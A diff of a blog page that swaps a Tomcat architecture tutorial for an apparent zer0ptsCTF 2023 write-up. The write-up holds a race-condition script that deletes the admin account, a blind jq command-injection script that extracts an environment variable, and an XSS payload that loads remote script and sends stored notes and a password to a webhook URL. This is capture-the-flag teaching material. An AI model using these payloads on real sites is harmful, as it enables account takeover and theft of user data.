@@ -13,27 +13,29 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/2023/07/13/tomcat-architecture/"/>
+    <link rel="canonical" href="http://example.com/2023/07/18/zer0ptsctf2023-wp/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="Tomcat ArchitectureThree major components of Java WebWhen the Tomcat receive a request, the request will pass Listener -&gt; Filter -&gt; Servlet orderly. ServletServlet is a program that is used to h">
+        <meta name="description" content="zer0ptsCTF2023 WPWarmuprofileA nice race condition problem. It is easy to find that, our goal is to delete the admin’s account and register a new one. However there is a strict checker before the oper">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Tomcat Architecture">
-<meta property="og:url" content="http://example.com/2023/07/13/Tomcat-Architecture/index.html">
+<meta property="og:title" content="zer0ptsCTF2023 WP">
+<meta property="og:url" content="http://example.com/2023/07/18/zer0ptsCTF2023-WP/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="Tomcat ArchitectureThree major components of Java WebWhen the Tomcat receive a request, the request will pass Listener -&gt; Filter -&gt; Servlet orderly. ServletServlet is a program that is used to h">
+<meta property="og:description" content="zer0ptsCTF2023 WPWarmuprofileA nice race condition problem. It is easy to find that, our goal is to delete the admin’s account and register a new one. However there is a strict checker before the oper">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2023/07/13/Tomcat-Architecture/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=.png">
-<meta property="og:image" content="http://example.com/2023/07/13/Tomcat-Architecture/TomcatConnector.png">
-<meta property="og:image" content="http://example.com/2023/07/13/Tomcat-Architecture/TomcatContainer.png">
-<meta property="article:published_time" content="2023-07-13T07:24:09.000Z">
-<meta property="article:modified_time" content="2023-07-14T09:48:52.646Z">
+<meta property="og:image" content="http://example.com/2023/07/18/zer0ptsCTF2023-WP/image-20230718130824146.png">
+<meta property="og:image" content="http://example.com/2023/07/18/zer0ptsCTF2023-WP/image-20230718141229322.png">
+<meta property="og:image" content="http://example.com/2023/07/18/zer0ptsCTF2023-WP/image-20230718144424825.png">
+<meta property="og:image" content="http://example.com/2023/07/18/zer0ptsCTF2023-WP/image-20230718171928155.png">
+<meta property="og:image" content="http://example.com/2023/07/18/zer0ptsCTF2023-WP/image-20230718172118824.png">
+<meta property="article:published_time" content="2023-07-18T04:56:00.000Z">
+<meta property="article:modified_time" content="2023-07-18T09:58:30.287Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="Java">
+<meta property="article:tag" content="WP">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2023/07/13/Tomcat-Architecture/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=.png">
+<meta name="twitter:image" content="http://example.com/2023/07/18/zer0ptsCTF2023-WP/image-20230718130824146.png">
     
     
     <!--- Icon Part-->
@@ -45,7 +47,7 @@
     
     <title>
         
-            Tomcat Architecture -
+            zer0ptsCTF2023 WP -
         
         P3ngu1nW
     </title>
@@ -200,7 +202,7 @@
             
             
                 <div class="article-title">
-                    <h1 class="article-title-regular">Tomcat Architecture</h1>
+                    <h1 class="article-title-regular">zer0ptsCTF2023 WP</h1>
                 </div>
             
                 
@@ -222,15 +224,15 @@
                             <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2023-07-13 15:24:09</span>
-        <span class="mobile">2023-07-13 15:24</span>
+        <span class="desktop">2023-07-18 12:56</span>
+        <span class="mobile">2023-07-18 12:56</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2023-07-14 17:48:52</span>
-            <span class="mobile">2023-07-14 17:48</span>
+            <span class="desktop">2023-07-18 17:58:30</span>
+            <span class="mobile">2023-07-18 17:58</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -242,7 +244,7 @@
             <ul>
                 
                     <li>
-                        <a href="/tags/Java/">Java</a>&nbsp;
+                        <a href="/tags/WP/">WP</a>&nbsp;
                     </li>
                 
             </ul>
@@ -265,40 +267,42 @@
             
 
             <div class="article-content markdown-body">
-                <h1 id="Tomcat-Architecture"><a href="#Tomcat-Architecture" class="headerlink" title="Tomcat Architecture"></a>Tomcat Architecture</h1><h2 id="Three-major-components-of-Java-Web"><a href="#Three-major-components-of-Java-Web" class="headerlink" title="Three major components of Java Web"></a>Three major components of Java Web</h2><p>When the Tomcat receive a request, the request will pass Listener -&gt; Filter -&gt; Servlet orderly.</p>
-<h3 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h3><p>Servlet is a program that is used to handle some requests and responses that have been encapsulated.</p>
-<p>We can write a demo to have a better understand.</p>
-<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.servletdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/servlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;init&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletRequest res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;services&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;destroy&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+                <h1 id="zer0ptsCTF2023-WP"><a href="#zer0ptsCTF2023-WP" class="headerlink" title="zer0ptsCTF2023 WP"></a>zer0ptsCTF2023 WP</h1><h2 id="Warmuprofile"><a href="#Warmuprofile" class="headerlink" title="Warmuprofile"></a>Warmuprofile</h2><p>A nice race condition problem.</p>
+<p>It is easy to find that, our goal is to delete the admin’s account and register a new one. However there is a strict checker before the operation.</p>
+<p>Considering the race condition, in one thread, the user has been destroyed, in another thread, we are executing the <code>User.destroy</code></p>
+<p>Once the user becomes null, we can delete all the users.</p>
+<img lazyload src="/images/loading.svg" data-src="/2023/07/18/zer0ptsCTF2023-WP/image-20230718130824146.png" class title="image-20230718130824146">
 
-<p>When we visit the route <code>/servlet</code>, this program can deal with our request.</p>
-<p>The <code>init</code> method will only be called at the first time we visit the route.</p>
-<p>The <code>service</code> method will be called when we send a request to this servlet. In class <code>HttpServlet</code>, developer has helped us to transform the <code>ServletRequest</code> and <code>ServletRequest</code> into <code>HttpServletRequest</code> and <code>HttpServletResponse</code>. Besides, <code>HttpSevlet</code> writes different methods for different http request methods(e.g. GET and doGET)</p>
-<p>The <code>destroy</code> method will be called when the servlet has been destroyed(e.g. the Server be closed)</p>
-<h3 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h3><p>Filter is a program for intercepting and inspecting ServletRequest and ServletResponse.</p>
-<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.servletdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        Filter.<span class="built_in">super</span>.init(filterConfig);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        Filter.<span class="built_in">super</span>.destroy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://CBUFJGPbdXQqWiRT:gLUdWZHQOeipJkra@misc2.2023.zer0pts.com:64794/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">sess</span>):</span><br><span class="line">    sess.post(url + <span class="string">&quot;user/a/delete&quot;</span>)</span><br><span class="line"></span><br><span class="line">sess = requests.session()</span><br><span class="line">sess.post(url + <span class="string">&quot;register&quot;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&#x27;a&#x27;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&#x27;a&#x27;</span>, <span class="string">&quot;profile&quot;</span>: <span class="string">&#x27;a&#x27;</span>&#125;)</span><br><span class="line">sess.post(url + <span class="string">&quot;login&quot;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&#x27;a&#x27;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&#x27;a&#x27;</span>&#125;)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    threading.Thread(target=run, args=(sess,)).start()</span><br><span class="line">res = requests.post(url + <span class="string">&quot;register&quot;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&#x27;admin&#x27;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&#x27;admin&#x27;</span>, <span class="string">&quot;profile&quot;</span>: <span class="string">&#x27;a&#x27;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure></div>
 
-<p>We can find that it has a similar structure to the servlet.</p>
-<h3 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h3><p>Listener is used to monitor the creation, destruction, modification of the Application, Session, and Request.</p>
-<h2 id="Apache-and-Tomcat"><a href="#Apache-and-Tomcat" class="headerlink" title="Apache and Tomcat"></a>Apache and Tomcat</h2><p>Apache is used to deal with the static resource and forward the request of dynamic resource.</p>
-<p>Tomcat is a servlet container, like an extension of the Apache, but it can run independent of Apache.</p>
-<p>There is a vivid metaphor that the Apache is like a truck, it can carry some stuff(e.g. html) directly, but it can’t carry the water(e.g. servlet) directly. The water should be stored in a container, and.the container is Tomcat.</p>
-<h2 id="Tomcat-Architecture-1"><a href="#Tomcat-Architecture-1" class="headerlink" title="Tomcat Architecture"></a>Tomcat Architecture</h2><img lazyload src="/images/loading.svg" data-src="/2023/07/13/Tomcat-Architecture/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=.png" class title="img">
+<p>In the official WP, we just need to login in two different sessions, and execute the delete operation.</p>
+<h2 id="jqi"><a href="#jqi" class="headerlink" title="jqi"></a>jqi</h2><p><a class="link" target="_blank" rel="noopener" href="https://jqlang.github.io/jq/manual/">what is jq? <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<blockquote>
+<p>A jq program is a “filter”: it takes an input, and produces an output. There are a lot of builtin filters for extracting a particular field of an object, or converting a number to a string, or various other standard tasks.</p>
+</blockquote>
+<p>In this problem, we are going to bypass the checker and inject into the jq command.</p>
+<img lazyload src="/images/loading.svg" data-src="/2023/07/18/zer0ptsCTF2023-WP/image-20230718141229322.png" class title="image-20230718141229322">
 
-<p>Generally, there are four components in Tomcat, that is, Server, Service, Connector, Container.</p>
-<p>Tow major components are: Connector and Container.</p>
-<h3 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h3><p>It represents the whole Tomcat server, and it should maintain the lifecycle of all services it contains, including how to initialize and end services</p>
-<h3 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h3><p>A Service is a group of one or more Connectors that share a single Container to process their incoming requests. This arrangement allows, for example, a non-SSL and SSL connector to share the same population of web apps.</p>
-<p>The standard implementation class for the Service interface in Tomcat is StandardService, which not only implements the Service interface but also the Lifecycle interface, allowing it to control the lifecycle of its underlying components</p>
-<h3 id="Connector"><a href="#Connector" class="headerlink" title="Connector"></a>Connector</h3><p>It is used to receive TCP connection requests from the browser, create a Request and Response object for exchanging data with the user, and then generate a thread to process the request and pass the generated Request and Response object to the thread(container) processing the request.</p>
-<img lazyload src="/images/loading.svg" data-src="/2023/07/13/Tomcat-Architecture/TomcatConnector.png" class title="img">
+<p>We can find that the checker has banned <code>&quot;</code> and<code>\(</code></p>
+<p>In order to inject our command, we can use <code>\</code> to escape double quotes, and we can submit two condition to close double quotes, and in command <code>env</code> , we can fetch the FLAG from system env variables.</p>
+<img lazyload src="/images/loading.svg" data-src="/2023/07/18/zer0ptsCTF2023-WP/image-20230718144424825.png" class title="image-20230718144424825">
 
-<h3 id="Container"><a href="#Container" class="headerlink" title="Container"></a>Container</h3><p>Container(also called Catalina) is used to handle servlet connection requests sent by the connector. It has four sub container, that is, Engine, Host, Context, Wrapper.</p>
-<img lazyload src="/images/loading.svg" data-src="/2023/07/13/Tomcat-Architecture/TomcatContainer.png" class title="img">
+<p>However, it will not return the FLAG directly, we need to use blind injection.</p>
+<p>We can use <code>explode</code> filter to transform the String into a number array, and use<code>| if .[0:1]&gt;=10 then halt_error(1) else halt end</code> to check whether we got the correct character.</p>
+<p>Besides, we can use binary search to accelerate this process.</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8300/api/search?keys=name%2Ctags%2Cauthor%2Cflag&amp;conds=&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%5C%20in%20name%2C%29%29%5D%20%7C%20env%20%7C%20.FLAG%20%7C%20explode%20%7C%20if%20.[&#123;id&#125;]&gt;=&#123;num&#125;%20then%20halt_error%281%29%20else%20halt%20end%20%23%20in%20name&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    l, r = <span class="number">0</span>, <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r - <span class="number">1</span>:</span><br><span class="line">        mid = (l + r) // <span class="number">2</span></span><br><span class="line">        res = requests.get(url + payload.<span class="built_in">format</span>(<span class="built_in">id</span>=i, num=mid))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;wrong&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid</span><br><span class="line">    flag = flag + <span class="built_in">chr</span>(l)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
 
-<h4 id="Engine"><a href="#Engine" class="headerlink" title="Engine"></a>Engine</h4><p>An Engine is a Container that represents the entire Catalina servlet engine.</p>
-<h4 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h4><p>A Host is a Container that represents a virtual host in the Catalina servlet engine.</p>
-<h4 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h4><p>A Context is a Container that represents a servlet context, and therefore an individual web application, in the Catalina servlet engine.</p>
-<h4 id="Wrapper"><a href="#Wrapper" class="headerlink" title="Wrapper"></a>Wrapper</h4><p>A Wrapper corresponds to a Servlet and is responsible for managing the Servlet, including Servlet loading, initialization, execution, and resource recovery.</p>
+<h2 id="Neko-note"><a href="#Neko-note" class="headerlink" title="Neko-note"></a>Neko-note</h2><p>We can see in function <code>replaceLinks</code>, there exists a variable splicing.</p>
+<img lazyload src="/images/loading.svg" data-src="/2023/07/18/zer0ptsCTF2023-WP/image-20230718171928155.png" class title="image-20230718171928155">
+
+<p>Note that the server doesn’t check the note’s title, so we can make a XSS here.</p>
+<img lazyload src="/images/loading.svg" data-src="/2023/07/18/zer0ptsCTF2023-WP/image-20230718172118824.png" class title="image-20230718172118824">
+
+<p>In onfocus, we can use <code>1 onfocus=document.body.appendChild(document.createElement(&quot;script&quot;)).src=&quot;VPS/evil.js&quot; autofocus</code> to load any js we want</p>
+<p>In our evil JS, we can use <code>document.execCommand(&#39;undo&#39;);</code> to recover the password and use <code>document.location</code> to transfer the information</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">execCommand</span>(<span class="string">&#x27;undo&#x27;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&#x27;https://webhook.site/968d6497-f519-45b9-be90-ffaa22eedc24/&#x27;</span>+<span class="built_in">escape</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;neko-note-history&#x27;</span>)))+<span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;input&#x27;</span>).<span class="property">value</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p><a class="link" target="_blank" rel="noopener" href="https://gist.github.com/lebr0nli/4a6a53e6825d83cfe74aa8eb370895f0">Official WP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 
             </div>
 
@@ -306,16 +310,16 @@
                 <div class="post-copyright-info">
                     <div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> Tomcat Architecture</li>
+        <li><strong>Title:</strong> zer0ptsCTF2023 WP</li>
         <li><strong>Author:</strong> P3ngu1nW</li>
-        <li><strong>Created at:</strong> 2023-07-13 15:24:09</li>
+        <li><strong>Created at:</strong> 2023-07-18 12:56:00</li>
         
             <li>
-                <strong>Updated at:</strong> 2023-07-14 17:48:52
+                <strong>Updated at:</strong> 2023-07-18 17:58:30
             </li>
         
         <li>
-            <strong>Link:</strong> https://p3ngu1nw.github.io/2023/07/13/Tomcat-Architecture/
+            <strong>Link:</strong> https://p3ngu1nw.github.io/2023/07/18/zer0ptsCTF2023-WP/
         </li>
         <li>
             <strong>License:</strong> This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>.
@@ -330,7 +334,7 @@
                 <ul class="post-tags-box">
                     
                         <li class="tag-item">
-                            <a href="/tags/Java/">#Java</a>&nbsp;
+                            <a href="/tags/WP/">#WP</a>&nbsp;
                         </li>
                     
                 </ul>
@@ -341,29 +345,14 @@
             
                 <div class="article-nav">
                     
-                        <div class="article-prev">
-                            <a class="prev"
-                            rel="prev"
-                            href="/2023/07/18/zer0ptsCTF2023-WP/"
-                            >
-                                <span class="left arrow-icon flex-center">
-                                    <i class="fa-solid fa-chevron-left"></i>
-                                </span>
-                                <span class="title flex-center">
-                                    <span class="post-nav-title-item">zer0ptsCTF2023 WP</span>
-                                    <span class="post-nav-item">Prev posts</span>
-                                </span>
-                            </a>
-                        </div>
-                    
                     
                         <div class="article-next">
                             <a class="next"
                             rel="next"
-                            href="/2023/07/11/Commons-Collections-Exploit/"
+                            href="/2023/07/13/Tomcat-Architecture/"
                             >
                                 <span class="title flex-center">
-                                    <span class="post-nav-title-item">Commons Collections Exploit</span>
+                                    <span class="post-nav-title-item">Tomcat Architecture</span>
                                     <span class="post-nav-item">Next posts</span>
                                 </span>
                                 <span class="right arrow-icon flex-center">
@@ -428,8 +417,8 @@
                 <div class="post-toc-wrap">
     <div class="post-toc">
         <div class="toc-title">On this page</div>
-        <div class="page-title">Tomcat Architecture</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Tomcat-Architecture"><span class="nav-text">Tomcat Architecture</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Three-major-components-of-Java-Web"><span class="nav-text">Three major components of Java Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Servlet"><span class="nav-text">Servlet</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Filter"><span class="nav-text">Filter</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Listener"><span class="nav-text">Listener</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Apache-and-Tomcat"><span class="nav-text">Apache and Tomcat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tomcat-Architecture-1"><span class="nav-text">Tomcat Architecture</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Server"><span class="nav-text">Server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Service"><span class="nav-text">Service</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Connector"><span class="nav-text">Connector</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Container"><span class="nav-text">Container</span></a></li></ol></li></ol></li></ol>
+        <div class="page-title">zer0ptsCTF2023 WP</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#zer0ptsCTF2023-WP"><span class="nav-text">zer0ptsCTF2023 WP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Warmuprofile"><span class="nav-text">Warmuprofile</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jqi"><span class="nav-text">jqi</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Neko-note"><span class="nav-text">Neko-note</span></a></li></ol></li></ol>
 
     </div>
 </div>
